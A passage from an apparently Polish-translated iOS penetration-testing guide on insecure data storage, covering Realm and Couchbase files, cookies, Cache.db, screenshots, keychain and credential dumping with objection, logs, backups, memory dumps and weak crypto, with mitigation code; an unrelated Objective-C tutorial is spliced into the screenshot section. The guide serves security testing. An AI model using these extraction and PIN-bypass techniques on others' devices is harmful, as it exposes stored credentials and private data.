[Realm Objective-C](https://realm.io/docs/objc/latest/) i [Realm Swift](https://realm.io/docs/swift/latest/) oferujÄ… potÄ™Å¼nÄ… alternatywÄ™ dla przechowywania danych, nieoferowanÄ… przez Apple. DomyÅ›lnie dane sÄ… przechowywane w niezaszyfrowanej formie, a szyfrowanie jest dostÄ™pne poprzez odpowiedniÄ… konfiguracjÄ™.

Bazy danych znajdujÄ… siÄ™ w: `/private/var/mobile/Containers/Data/Application/{APPID}`. Aby przeglÄ…daÄ‡ te pliki, moÅ¼na uÅ¼yÄ‡ poleceÅ„ takich jak:
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Do przeglÄ…dania tych plikÃ³w bazy danych zaleca siÄ™ narzÄ™dzie [**Realm Studio**](https://github.com/realm/realm-studio).

Aby zaimplementowaÄ‡ szyfrowanie w bazie danych Realm, moÅ¼na uÅ¼yÄ‡ nastÄ™pujÄ…cego fragmentu kodu:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Bazy danych Couchbase Lite

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios) jest opisany jako **lekka** i **wbudowana** baza danych, ktÃ³ra stosuje podejÅ›cie **zorientowane na dokumenty** (NoSQL). Zaprojektowana z myÅ›lÄ… o systemach **iOS** i **macOS**, oferuje moÅ¼liwoÅ›Ä‡ synchronizacji danych w sposÃ³b bezproblemowy.

Aby zidentyfikowaÄ‡ potencjalne bazy danych Couchbase na urzÄ…dzeniu, naleÅ¼y sprawdziÄ‡ nastÄ™pujÄ…cy katalog:
```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```
### Ciasteczka

iOS przechowuje ciasteczka aplikacji w folderze **`Library/Cookies/cookies.binarycookies`** wewnÄ…trz folderu kaÅ¼dej aplikacji. JednakÅ¼e, czasami deweloperzy decydujÄ… siÄ™ zapisaÄ‡ je w **keychainie**, poniewaÅ¼ wspomniany **plik z ciasteczkami moÅ¼e byÄ‡ dostÄ™pny w kopii zapasowej**.

Aby przejrzeÄ‡ plik z ciasteczkami, moÅ¼esz skorzystaÄ‡ z [**tego skryptu pythonowego**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) lub uÅ¼yÄ‡ polecenia **`ios cookies get`** w narzÄ™dziu objection.\
**MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ narzÄ™dzia objection do** konwersji tych plikÃ³w na format JSON i przejrzenia danych.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### PamiÄ™Ä‡ podrÄ™czna

DomyÅ›lnie NSURLSession przechowuje dane, takie jak **Å¼Ä…dania i odpowiedzi HTTP w bazie danych Cache.db**. Ta baza danych moÅ¼e zawieraÄ‡ **wraÅ¼liwe dane**, jeÅ›li tokeny, nazwy uÅ¼ytkownikÃ³w lub jakiekolwiek inne wraÅ¼liwe informacje zostaÅ‚y zapisane w pamiÄ™ci podrÄ™cznej. Aby znaleÅºÄ‡ zapisane informacje, otwÃ³rz katalog danych aplikacji (`/var/mobile/Containers/Data/Application/<UUID>`) i przejdÅº do `/Library/Caches/<Bundle Identifier>`. **PamiÄ™Ä‡ podrÄ™czna WebKit jest rÃ³wnieÅ¼ przechowywana w pliku Cache.db**. **Objection** moÅ¼e otworzyÄ‡ i interakcjonowaÄ‡ z bazÄ… danych za pomocÄ… polecenia `sqlite connect Cache.db`, poniewaÅ¼ jest to **zwykÅ‚a baza danych SQLite**.

Zaleca siÄ™ **wyÅ‚Ä…czenie pamiÄ™ci podrÄ™cznej tych danych**, poniewaÅ¼ mogÄ… one zawieraÄ‡ wraÅ¼liwe informacje w Å¼Ä…daniu lub odpowiedzi. PoniÅ¼ej przedstawiono rÃ³Å¼ne sposoby osiÄ…gniÄ™cia tego:

1. Zaleca siÄ™ usuniÄ™cie zapisanych odpowiedzi z pamiÄ™ci podrÄ™cznej po wylogowaniu. MoÅ¼na to zrobiÄ‡ za pomocÄ… dostarczonej przez Apple metody o nazwie [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses). MoÅ¼na wywoÅ‚aÄ‡ tÄ™ metodÄ™ w nastÄ™pujÄ…cy sposÃ³b:

`URLCache.shared.removeAllCachedResponses()`

Ta metoda usunie wszystkie zapisane Å¼Ä…dania i odpowiedzi z pliku Cache.db.
2. JeÅ›li nie potrzebujesz korzystaÄ‡ z plikÃ³w cookie, zaleca siÄ™ uÅ¼ycie wÅ‚aÅ›ciwoÅ›ci [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) konfiguracji URLSession, ktÃ³ra wyÅ‚Ä…czy zapisywanie plikÃ³w cookie i pamiÄ™ci podrÄ™cznej.

[Dokumentacja Apple](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`Obiekt konfiguracji sesji tymczasowej jest podobny do domyÅ›lnej konfiguracji sesji (patrz default), z wyjÄ…tkiem tego, Å¼e odpowiadajÄ…cy mu obiekt sesji nie przechowuje pamiÄ™ci podrÄ™cznej, magazynÃ³w poÅ›wiadczeÅ„ ani Å¼adnych danych zwiÄ…zanych z sesjÄ… na dysku. Zamiast tego dane zwiÄ…zane z sesjÄ… sÄ… przechowywane w pamiÄ™ci RAM. Jedynym przypadkiem, w ktÃ³rym sesja tymczasowa zapisuje dane na dysku, jest wtedy, gdy polecisz jej zapisaÄ‡ zawartoÅ›Ä‡ adresu URL do pliku.`
3. PamiÄ™Ä‡ podrÄ™czna moÅ¼e rÃ³wnieÅ¼ zostaÄ‡ wyÅ‚Ä…czona poprzez ustawienie polityki pamiÄ™ci podrÄ™cznej na [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed). Spowoduje to wyÅ‚Ä…czenie przechowywania pamiÄ™ci podrÄ™cznej w dowolny sposÃ³b, zarÃ³wno w pamiÄ™ci, jak i na dysku.

### Zrzuty ekranu

Zawsze, gdy naciÅ›niesz przycisk Home, iOS **robi zrzut ekranu** aktualnego ekranu, aby umoÅ¼liwiÄ‡ pÅ‚ynne przejÅ›cie do aplikacji. Jednak jeÅ›li na aktualnym ekranie znajdujÄ… siÄ™ **wraÅ¼liwe dane**, zostanÄ… one **zapisane** w **obrazie** (ktÃ³ry **przetrwa** **ponowne uruchomienie**). SÄ… to zrzuty ekranu, do ktÃ³rych moÅ¼na rÃ³wnieÅ¼ uzyskaÄ‡ dostÄ™p, podwÃ³jnie klikajÄ…c ekran gÅ‚Ã³wny, aby przeÅ‚Ä…czyÄ‡ siÄ™ miÄ™dzy aplikacjami.

Chyba Å¼e iPhone jest odblokowany, **atakujÄ…cy** musi mieÄ‡ **dostÄ™p** do **odblokowanego urzÄ…dzenia**, aby zobaczyÄ‡ te zrzuty ekranu. DomyÅ›lnie ostatni zrzut ekranu jest przechowywany w sandboxie aplikacji w folderze `Library/Caches/Snapshots/` lub `Library/SplashBoard/Snapshots` (zaufane komputery nie majÄ… dostÄ™pu do systemu plikÃ³w od wersji iOS 7.0).

Jednym ze sposobÃ³w zapobieÅ¼enia temu niepoÅ¼Ä…danemu zachowaniu jest umieszczenie pustego ekranu lub usuniÄ™cie wraÅ¼liwych danych przed zrobieniem zrzutu ekranu za pomocÄ… funkcji `ApplicationDidEnterBackground()`.

PoniÅ¼ej przedstawiono przykÅ‚adowÄ… metodÄ™ naprawczÄ…, ktÃ³ra ustawia domyÅ›lny zrzut ekranu.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Objective-C:

Objective-C jest jÄ™zykiem programowania uÅ¼ywanym gÅ‚Ã³wnie do tworzenia aplikacji na platformÄ™ iOS. Jest to rozszerzenie jÄ™zyka C, ktÃ³re wprowadza obiektowoÅ›Ä‡ i dynamiczne wiÄ…zanie. W celu przeprowadzenia testÃ³w penetracyjnych na aplikacjach iOS, waÅ¼ne jest zrozumienie podstawowych konstrukcji jÄ™zyka Objective-C.

### Klasa

Klasa w Objective-C jest podstawowÄ… jednostkÄ… programowÄ…, ktÃ³ra definiuje obiekt. SkÅ‚ada siÄ™ z deklaracji interfejsu i implementacji. Interfejs klasy zawiera deklaracje metod i wÅ‚aÅ›ciwoÅ›ci, podczas gdy implementacja zawiera kod ÅºrÃ³dÅ‚owy tych metod.

```objective-c
@interface MojaKlasa : NSObject

@property (nonatomic, strong) NSString *nazwa;

- (void)metoda;

@end

@implementation MojaKlasa

- (void)metoda {
    NSLog(@"WywoÅ‚ano metodÄ™");
}

@end
```

### Metoda

Metoda w Objective-C jest funkcjÄ…, ktÃ³ra jest wywoÅ‚ywana na obiekcie danej klasy. MoÅ¼e przyjmowaÄ‡ argumenty i zwracaÄ‡ wartoÅ›Ä‡. Metody sÄ… deklarowane w interfejsie klasy i implementowane w jej implementacji.

```objective-c
- (void)metoda {
    // Kod metody
}
```

### WÅ‚aÅ›ciwoÅ›Ä‡

WÅ‚aÅ›ciwoÅ›Ä‡ w Objective-C jest mechanizmem dostÄ™pu do danych obiektu. MoÅ¼e mieÄ‡ okreÅ›lony typ i atrybuty, takie jak `readonly` lub `readwrite`. WÅ‚aÅ›ciwoÅ›ci sÄ… deklarowane w interfejsie klasy i automatycznie generujÄ… getterÃ³w i setterÃ³w.

```objective-c
@property (nonatomic, strong) NSString *nazwa;
```

### WiÄ…zanie dynamiczne

WiÄ…zanie dynamiczne w Objective-C odnosi siÄ™ do procesu wywoÅ‚ywania metod w czasie wykonania. W odrÃ³Å¼nieniu od wiÄ…zania statycznego, ktÃ³re odbywa siÄ™ podczas kompilacji, wiÄ…zanie dynamiczne pozwala na elastyczne wywoÅ‚ywanie metod w zaleÅ¼noÅ›ci od typu obiektu.

```objective-c
MojaKlasa *obiekt = [[MojaKlasa alloc] init];
[obiekt metoda];
```

### Selektor

Selektor w Objective-C jest identyfikatorem metody. MoÅ¼e byÄ‡ uÅ¼ywany do dynamicznego wywoÅ‚ywania metod na obiekcie. Selektor jest reprezentowany przez typ `SEL`.

```objective-c
SEL metodaSelector = @selector(metoda);
[obiekt performSelector:metodaSelector];
```

### Kategoria

Kategoria w Objective-C pozwala na dodawanie metod do istniejÄ…cej klasy bez koniecznoÅ›ci modyfikowania jej kodu ÅºrÃ³dÅ‚owego. Kategoria jest uÅ¼ywana do rozszerzania funkcjonalnoÅ›ci istniejÄ…cych klas.

```objective-c
@interface MojaKlasa (Kategoria)

- (void)nowaMetoda;

@end

@implementation MojaKlasa (Kategoria)

- (void)nowaMetoda {
    NSLog(@"Nowa metoda");
}

@end
```

### ProtokÃ³Å‚

ProtokÃ³Å‚ w Objective-C definiuje zestaw wymaganych i opcjonalnych metod, ktÃ³re klasa moÅ¼e zaimplementowaÄ‡. ProtokÃ³Å‚ jest uÅ¼ywany do zapewnienia spÃ³jnoÅ›ci interfejsu miÄ™dzy klasami.

```objective-c
@protocol MÃ³jProtokÃ³Å‚

- (void)wymaganaMetoda;

@optional
- (void)opcjonalnaMetoda;

@end
```

### ARC (Automatyczne ZarzÄ…dzanie PamiÄ™ciÄ…)

ARC w Objective-C jest mechanizmem automatycznego zarzÄ…dzania pamiÄ™ciÄ…. Eliminuje potrzebÄ™ rÄ™cznego zarzÄ…dzania pamiÄ™ciÄ… poprzez automatyczne dodawanie i usuwanie instrukcji `retain`, `release` i `autorelease`.

```objective-c
MojaKlasa *obiekt = [[MojaKlasa alloc] init];
// ARC automatycznie zarzÄ…dza pamiÄ™ciÄ…
```

### Referencje sÅ‚abe

Referencje sÅ‚abe w Objective-C sÄ… uÅ¼ywane do unikania cyklicznych odwoÅ‚aÅ„ miÄ™dzy obiektami. Obiekty, na ktÃ³re wskazujÄ… referencje sÅ‚abe, mogÄ… zostaÄ‡ automatycznie zwolnione, jeÅ›li nie sÄ… juÅ¼ referencjonowane przez inne obiekty.

```objective-c
@property (nonatomic, weak) MojaKlasa *referencjaSlaba;
```

### Referencje silne

Referencje silne w Objective-C sÄ… uÅ¼ywane do utrzymania obiektÃ³w w pamiÄ™ci. Obiekty, na ktÃ³re wskazujÄ… referencje silne, nie zostanÄ… automatycznie zwolnione, dopÃ³ki nie zostanÄ… one ustawione na `nil`.

```objective-c
@property (nonatomic, strong) MojaKlasa *referencjaSilna;
```

### Bloki

Bloki w Objective-C sÄ… obiektami, ktÃ³re mogÄ… przechowywaÄ‡ kod. MogÄ… byÄ‡ przekazywane jako argumenty do innych metod i wywoÅ‚ywane w dowolnym miejscu w kodzie.

```objective-c
void (^blok)(void) = ^{
    NSLog(@"WywoÅ‚ano blok");
};

blok();
```

### WyjÄ…tki

WyjÄ…tki w Objective-C sÄ… uÅ¼ywane do obsÅ‚ugi bÅ‚Ä™dÃ³w i wyjÄ…tkowych sytuacji. WyjÄ…tki mogÄ… byÄ‡ zgÅ‚aszane i przechwytywane za pomocÄ… instrukcji `@try`, `@catch` i `@finally`.

```objective-c
@try {
    // Kod, ktÃ³ry moÅ¼e zgÅ‚osiÄ‡ wyjÄ…tek
}
@catch (NSException *exception) {
    // ObsÅ‚uga zgÅ‚oszonego wyjÄ…tku
}
@finally {
    // Kod, ktÃ³ry zostanie wykonany niezaleÅ¼nie od zgÅ‚oszonego wyjÄ…tku
}
```
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
To ustawia obraz tÅ‚a na `overlayImage.png` za kaÅ¼dym razem, gdy aplikacja jest w tle. Zapobiega to wyciekom poufnych danych, poniewaÅ¼ `overlayImage.png` zawsze zastÄ™puje bieÅ¼Ä…cy widok.

### Keychain

Do dostÄ™pu i zarzÄ…dzania iOS keychain, dostÄ™pne sÄ… narzÄ™dzia takie jak [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper), ktÃ³re sÄ… odpowiednie dla urzÄ…dzeÅ„ z jailbreakiem. Dodatkowo, [**Objection**](https://github.com/sensepost/objection) udostÄ™pnia polecenie `ios keychain dump` do podobnych celÃ³w.

#### **Przechowywanie poÅ›wiadczeÅ„**

Klasa **NSURLCredential** jest idealna do przechowywania poufnych informacji bezpoÅ›rednio w keychain, omijajÄ…c koniecznoÅ›Ä‡ uÅ¼ycia NSUserDefaults lub innych opakowaÅ„. Aby przechowywaÄ‡ poÅ›wiadczenia po zalogowaniu, uÅ¼ywany jest nastÄ™pujÄ…cy kod Swift:
```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Aby wyodrÄ™bniÄ‡ te przechowywane poÅ›wiadczenia, uÅ¼ywane jest polecenie Objection `ios nsurlcredentialstorage dump`.

## **Niestandardowe klawiatury i pamiÄ™Ä‡ podrÄ™czna klawiatury**

Od wersji iOS 8.0 uÅ¼ytkownicy mogÄ… instalowaÄ‡ rozszerzenia niestandardowych klawiatur, ktÃ³re moÅ¼na zarzÄ…dzaÄ‡ w **Ustawienia > OgÃ³lne > Klawiatura > Klawiatury**. ChociaÅ¼ te klawiatury oferujÄ… rozszerzonÄ… funkcjonalnoÅ›Ä‡, stanowiÄ… ryzyko rejestrowania naciÅ›niÄ™tych klawiszy i przesyÅ‚ania danych do zewnÄ™trznych serwerÃ³w, choÄ‡ uÅ¼ytkownicy sÄ… informowani o klawiaturach wymagajÄ…cych dostÄ™pu do sieci. Aplikacje mogÄ… i powinny ograniczaÄ‡ korzystanie z niestandardowych klawiatur do wprowadzania informacji poufnych.

**Zalecenia dotyczÄ…ce bezpieczeÅ„stwa:**
- Zaleca siÄ™ wyÅ‚Ä…czenie klawiatur stron trzecich dla zwiÄ™kszenia bezpieczeÅ„stwa.
- NaleÅ¼y byÄ‡ Å›wiadomym funkcji autocorrect i auto-sugestii domyÅ›lnej klawiatury iOS, ktÃ³ra moÅ¼e przechowywaÄ‡ poufne informacje w plikach pamiÄ™ci podrÄ™cznej znajdujÄ…cych siÄ™ w `Library/Keyboard/{locale}-dynamic-text.dat` lub `/private/var/mobile/Library/Keyboard/dynamic-text.dat`. Te pliki pamiÄ™ci podrÄ™cznej powinny byÄ‡ regularnie sprawdzane pod kÄ…tem poufnych danych. Zaleca siÄ™ resetowanie sÅ‚ownika klawiatury za pomocÄ… **Ustawienia > OgÃ³lne > Resetuj > Resetuj sÅ‚ownik klawiatury** w celu wyczyszczenia danych w pamiÄ™ci podrÄ™cznej.
- Przechwycenie ruchu sieciowego moÅ¼e ujawniÄ‡, czy niestandardowa klawiatura przesyÅ‚a zdalnie naciÅ›niÄ™te klawisze.

### **Zapobieganie buforowaniu pÃ³l tekstowych**

ProtokÃ³Å‚ [UITextInputTraits](https://developer.apple.com/reference/uikit/uitextinputtraits) oferuje wÅ‚aÅ›ciwoÅ›ci do zarzÄ…dzania autokorektÄ… i wprowadzaniem tekstu zabezpieczonego, co jest niezbÄ™dne do zapobiegania buforowaniu poufnych informacji. Na przykÅ‚ad, wyÅ‚Ä…czenie autokorekty i wÅ‚Ä…czenie wprowadzania tekstu zabezpieczonego moÅ¼na osiÄ…gnÄ…Ä‡ za pomocÄ…:
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
Dodatkowo, programiÅ›ci powinni upewniÄ‡ siÄ™, Å¼e pola tekstowe, zwÅ‚aszcza te sÅ‚uÅ¼Ä…ce do wprowadzania wraÅ¼liwych informacji, takich jak hasÅ‚a i PIN-y, wyÅ‚Ä…czajÄ… buforowanie, ustawiajÄ…c `autocorrectionType` na `UITextAutocorrectionTypeNo` i `secureTextEntry` na `YES`.
```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Dzienniki**

Debugowanie kodu czÄ™sto wymaga uÅ¼ycia **dziennikÃ³w**. Istnieje ryzyko zwiÄ…zane z tym, Å¼e **dzienniki mogÄ… zawieraÄ‡ poufne informacje**. WczeÅ›niej, w systemie iOS 6 i wczeÅ›niejszych wersjach, dzienniki byÅ‚y dostÄ™pne dla wszystkich aplikacji, co stanowiÅ‚o ryzyko wycieku poufnych danych. **Obecnie aplikacje majÄ… ograniczony dostÄ™p tylko do swoich dziennikÃ³w**.

Mimo tych ograniczeÅ„, **atakujÄ…cy majÄ…cy fizyczny dostÄ™p** do odblokowanego urzÄ…dzenia wciÄ…Å¼ moÅ¼e wykorzystaÄ‡ to, podÅ‚Ä…czajÄ…c urzÄ…dzenie do komputera i **czytajÄ…c dzienniki**. WaÅ¼ne jest zauwaÅ¼enie, Å¼e dzienniki pozostajÄ… na dysku nawet po odinstalowaniu aplikacji.

Aby zmniejszyÄ‡ ryzyko, zaleca siÄ™ **dokÅ‚adne interakcje z aplikacjÄ…**, eksplorowanie wszystkich jej funkcji i wprowadzanych danych, aby upewniÄ‡ siÄ™, Å¼e nie sÄ… nieumyÅ›lnie rejestrowane poufne informacje.

Podczas przeglÄ…dania kodu ÅºrÃ³dÅ‚owego aplikacji w poszukiwaniu potencjalnych wyciekÃ³w, naleÅ¼y szukaÄ‡ zarÃ³wno **predefiniowanych** jak i **niestandardowych instrukcji logowania** za pomocÄ… sÅ‚Ã³w kluczowych takich jak `NSLog`, `NSAssert`, `NSCAssert`, `fprintf` dla wbudowanych funkcji oraz wszelkich wzmianek o `Logging` lub `Logfile` dla niestandardowych implementacji.

### **Monitorowanie dziennikÃ³w systemowych**

Aplikacje rejestrujÄ… rÃ³Å¼ne informacje, ktÃ³re mogÄ… byÄ‡ poufne. Aby monitorowaÄ‡ te dzienniki, moÅ¼na uÅ¼ywaÄ‡ narzÄ™dzi i poleceÅ„ takich jak:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```
sÄ… przydatne. Dodatkowo, **Xcode** umoÅ¼liwia zbieranie logÃ³w konsoli:

1. OtwÃ³rz Xcode.
2. PodÅ‚Ä…cz urzÄ…dzenie iOS.
3. PrzejdÅº do **Okno** -> **UrzÄ…dzenia i symulatory**.
4. Wybierz swoje urzÄ…dzenie.
5. WywoÅ‚aj problem, ktÃ³ry badasz.
6. UÅ¼yj przycisku **OtwÃ³rz konsolÄ™**, aby wyÅ›wietliÄ‡ logi w nowym oknie.

Aby uzyskaÄ‡ bardziej zaawansowane logowanie, poÅ‚Ä…czenie z powÅ‚okÄ… urzÄ…dzenia i uÅ¼ycie **socat** moÅ¼e umoÅ¼liwiÄ‡ monitorowanie logÃ³w w czasie rzeczywistym:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```
NastÄ™pnie wykonaj polecenia, aby obserwowaÄ‡ aktywnoÅ›Ä‡ dziennika, co moÅ¼e byÄ‡ nieocenione przy diagnozowaniu problemÃ³w lub identyfikowaniu potencjalnych wyciekÃ³w danych w dziennikach.


***

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby Å‚atwo tworzyÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** z wykorzystaniem najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ciowych na Å›wiecie.\
Otrzymaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Kopie zapasowe

Funkcje **automatycznego tworzenia kopii zapasowych** sÄ… zintegrowane w systemie iOS i uÅ‚atwiajÄ… tworzenie kopii danych urzÄ…dzenia za pomocÄ… iTunes (do macOS Catalina), Finder (od macOS Catalina) lub iCloud. Kopie zapasowe obejmujÄ… prawie wszystkie dane urzÄ…dzenia, z wyjÄ…tkiem bardzo wraÅ¼liwych elementÃ³w, takich jak szczegÃ³Å‚y Apple Pay i konfiguracje Touch ID.

### Ryzyko bezpieczeÅ„stwa

WÅ‚Ä…czenie **zainstalowanych aplikacji i ich danych** do kopii zapasowych stwarza ryzyko potencjalnego **wycieku danych** i zagroÅ¼enia, Å¼e **modyfikacje kopii zapasowych mogÄ… zmieniÄ‡ funkcjonalnoÅ›Ä‡ aplikacji**. Zaleca siÄ™ **nie przechowywaÄ‡ wraÅ¼liwych informacji w postaci tekstowej** w katalogu aplikacji lub jego podkatalogach, aby zminimalizowaÄ‡ te ryzyka.

### WyÅ‚Ä…czanie plikÃ³w z kopii zapasowych

Pliki w `Documents/` i `Library/Application Support/` sÄ… domyÅ›lnie kopiowane do kopii zapasowych. Deweloperzy mogÄ… wykluczyÄ‡ okreÅ›lone pliki lub katalogi z kopii zapasowych, uÅ¼ywajÄ…c `NSURL setResourceValue:forKey:error:` z `NSURLIsExcludedFromBackupKey`. Ta praktyka jest istotna dla ochrony wraÅ¼liwych danych przed uwzglÄ™dnieniem ich w kopii zapasowej.

### Testowanie podatnoÅ›ci

Aby oceniÄ‡ bezpieczeÅ„stwo kopii zapasowej aplikacji, rozpocznij od **utworzenia kopii zapasowej** za pomocÄ… Finder, a nastÄ™pnie zlokalizuj jÄ…, korzystajÄ…c z instrukcji w [oficjalnej dokumentacji Apple](https://support.apple.com/en-us/HT204215). Analizuj kopiÄ™ zapasowÄ… pod kÄ…tem wraÅ¼liwych danych lub konfiguracji, ktÃ³re mogÄ… zostaÄ‡ zmienione, aby wpÅ‚ynÄ…Ä‡ na zachowanie aplikacji.

WraÅ¼liwe informacje moÅ¼na wyszukaÄ‡ za pomocÄ… narzÄ™dzi wiersza poleceÅ„ lub aplikacji takich jak [iMazing](https://imazing.com). W przypadku zaszyfrowanych kopii zapasowych moÅ¼na potwierdziÄ‡ obecnoÅ›Ä‡ szyfrowania, sprawdzajÄ…c klucz "IsEncrypted" w pliku "Manifest.plist" w gÅ‚Ã³wnym katalogu kopii zapasowej.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
Aby radziÄ‡ sobie z zaszyfrowanymi kopiami zapasowymi, mogÄ… byÄ‡ przydatne skrypty Python dostÄ™pne w repozytorium [GitHub DinoSec](https://github.com/dinosec/iphone-dataprotection/tree/master/python_scripts), takie jak **backup_tool.py** i **backup_passwd.py**, choÄ‡ mogÄ… wymagaÄ‡ dostosowania do najnowszych wersji iTunes/Finder. InnÄ… opcjÄ… dostÄ™pu do plikÃ³w w zabezpieczonych hasÅ‚em kopii zapasowych jest narzÄ™dzie [**iOSbackup**](https://pypi.org/project/iOSbackup/).

### Modyfikowanie zachowania aplikacji

PrzykÅ‚ad zmiany zachowania aplikacji poprzez modyfikacje kopii zapasowej jest pokazany w aplikacji portfela bitcoin [Bither](https://github.com/bither/bither-ios), gdzie PIN blokady interfejsu jest przechowywany w pliku `net.bither.plist` pod kluczem **pin_code**. UsuniÄ™cie tego klucza z pliku plist i przywrÃ³cenie kopii zapasowej usuwa wymaganie PIN, umoÅ¼liwiajÄ…c nielimitowany dostÄ™p.

## Podsumowanie dotyczÄ…ce testowania pamiÄ™ci wraÅ¼liwej na dane

Podczas pracy z wraÅ¼liwymi informacjami przechowywanymi w pamiÄ™ci aplikacji, waÅ¼ne jest ograniczenie czasu ekspozycji tych danych. IstniejÄ… dwie podstawowe metody badania zawartoÅ›ci pamiÄ™ci: **tworzenie zrzutu pamiÄ™ci** i **analiza pamiÄ™ci w czasie rzeczywistym**. Oba metody majÄ… swoje wyzwania, w tym potencjalne pominiÄ™cie istotnych danych podczas procesu zrzutu lub analizy.

## **Pobieranie i analiza zrzutu pamiÄ™ci**

Dla urzÄ…dzeÅ„ z jailbreakiem i bez jailbreaka, narzÄ™dzia takie jak [objection](https://github.com/sensepost/objection) i [Fridump](https://github.com/Nightbringer21/fridump) umoÅ¼liwiajÄ… zrzucanie pamiÄ™ci procesu aplikacji. Po zrzuceniu, do analizy tych danych wymagane sÄ… rÃ³Å¼ne narzÄ™dzia, w zaleÅ¼noÅ›ci od rodzaju poszukiwanych informacji.

Aby wyodrÄ™bniÄ‡ ciÄ…gi znakÃ³w z zrzutu pamiÄ™ci, moÅ¼na uÅ¼yÄ‡ poleceÅ„ takich jak `strings` lub `rabin2 -zz`:
```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Dla bardziej szczegÃ³Å‚owej analizy, w tym wyszukiwania konkretnych typÃ³w danych lub wzorcÃ³w, **radare2** oferuje rozlegÅ‚e moÅ¼liwoÅ›ci wyszukiwania:
```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```
## **Analiza pamiÄ™ci w czasie rzeczywistym**

**r2frida** dostarcza potÄ™Å¼nej alternatywy do badania pamiÄ™ci aplikacji w czasie rzeczywistym, bez koniecznoÅ›ci tworzenia zrzutu pamiÄ™ci. NarzÄ™dzie to umoÅ¼liwia wykonywanie poleceÅ„ wyszukiwania bezpoÅ›rednio w pamiÄ™ci dziaÅ‚ajÄ…cej aplikacji:
```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```
## SÅ‚aba kryptografia

### NiewÅ‚aÅ›ciwe procesy zarzÄ…dzania kluczami

NiektÃ³rzy programiÅ›ci zapisujÄ… wraÅ¼liwe dane w lokalnym magazynie i szyfrujÄ… je kluczem wpisanym/wykrywalnym w kodzie. Nie powinno siÄ™ tego robiÄ‡, poniewaÅ¼ odwrÃ³cenie procesu moÅ¼e umoÅ¼liwiÄ‡ atakujÄ…cym wydobycie poufnych informacji.

### UÅ¼ycie niebezpiecznych i/lub przestarzaÅ‚ych algorytmÃ³w

ProgramiÅ›ci nie powinni uÅ¼ywaÄ‡ **przestarzaÅ‚ych algorytmÃ³w** do przeprowadzania **sprawdzeÅ„** autoryzacji, **przechowywania** lub **wysyÅ‚ania** danych. NiektÃ³re z tych algorytmÃ³w to: RC4, MD4, MD5, SHA1... JeÅ›li do przechowywania haseÅ‚ uÅ¼ywane sÄ… **skrÃ³ty**, powinny byÄ‡ uÅ¼ywane skrÃ³ty odporne na ataki brute-force z solÄ….

### Sprawdzenie

